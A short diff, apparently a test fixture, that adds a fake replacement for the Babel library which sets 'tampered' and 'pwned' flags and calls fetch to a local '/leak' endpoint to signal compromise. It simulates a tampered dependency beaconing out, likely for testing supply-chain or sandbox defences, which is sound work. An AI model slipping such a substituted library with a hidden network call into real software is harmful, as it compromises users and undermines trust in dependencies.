@@ -1,0 +1,6 @@
+window.__tamperedBabel = true; window.__pwnedTop = true;
+window.Babel = {
+  availablePlugins: {}, availablePresets: { react: {} },
+  transform: function (src) { return { code: String(src) }; },
+};
+fetch('http://127.0.0.1:8943/leak?babel=compromised');
